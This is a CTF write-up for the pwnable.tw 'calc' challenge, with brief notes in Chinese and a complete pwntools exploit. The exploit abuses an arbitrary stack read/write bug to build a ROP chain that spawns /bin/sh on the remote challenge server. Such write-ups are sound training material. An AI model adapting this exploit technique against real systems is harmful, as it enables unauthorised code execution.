# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> 任意读写 -> 栈溢出 -> ROP -> execve("/bin/sh", 0, 0)

根据程序逻辑分析得到，输入`+N`可以读栈上内存，输入`+N-M`可以向栈上写（注意`int`范围），恰好返回地址及其之后都可以写且不会被清空，构造ROP拿到shell即可。

# exp

```python
from pwn import *

DEBUG = 0

if DEBUG:
    context(log_level = 'debug')
    p = process('./calc.dms')
    gdb.attach(p, '''b *0x0804938D''')
else:
    p = remote('chall.pwnable.tw', 10100)

p.recvuntil('===\n')

addr = 361

pad = 0xdeadbeef

# int 80
g1 = 0x08049a21 # int 0x80

# ecx -> 0, eax -> 0
g2 = 0x08049f13 # xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret

# edx -> 0, ebx -> '/bin/sh\x00'
g3 = 0x080b6252 # pop ebx ; mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret

# eax -> 11
g4 = 0x0807cb7e # nop ; inc eax ; ret

# ebp addr
p.sendline('+360')
r = int(p.recvline())
ebp_addr = r - 0x20
log.info(ebp_addr)
def gen(code):
    global addr
    payload = '+%d' % addr
    p.sendline(payload)
    r = int(p.recvline())
    log.info('ori: ' + hex(code) +' diff: ' + hex(code - r))
    if code - r >= 0x80000000:
        payload = '+%d-%d' % (addr, r + 0x100000000 - code)
    elif code - r >= 0x0:
        payload = '+%d+%d' % (addr, code - r)
    elif r - code >= 0x80000000:
        payload = '+%d+%d' % (addr, code + 0x100000000 - r)
    else:
        payload = '+%d-%d' % (addr, r - code)
    p.sendline(payload)
    p.recvline() 
    addr += 1

gen(g2)     # ret
gen(pad)    # pop ebx
gen(pad)    # pop esi
gen(pad)    # pop edi
gen(pad)    # pop ebp

gen(g3)     # ret
gen(ebp_addr + (400-360) * 4)   # pop ebx
gen(pad)    # pop esi
gen(pad)    # pop edi
gen(pad)    # pop ebp

# eax -> 11
for i in range(11):
    gen(g4)

gen(g1)     # ret

for i in range(400 - addr):
    gen(pad)

gen(u32('/bin'))
gen(u32('/sh\x00'))

p.interactive()
```
